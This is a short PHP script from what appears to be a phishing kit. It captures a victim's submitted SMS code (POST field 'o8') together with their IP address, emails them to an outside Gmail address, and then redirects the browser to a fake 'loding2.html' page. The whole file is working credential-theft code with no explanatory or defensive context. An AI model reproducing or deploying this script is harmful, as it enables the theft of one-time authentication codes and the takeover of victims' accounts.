<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[AML]\n";
$message .= "SMS      : ".$_POST['o8']."\n";
$message .= "[DON]\n";
$send = "inoxx-inoxxfranck1@gmail.com";
$subject = "DON[SMS] $ip";
$headers = "From: [AML]<inoxx-inoxxfranck1@gmail.com>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./loding2.html");
// -->
</script>';
?>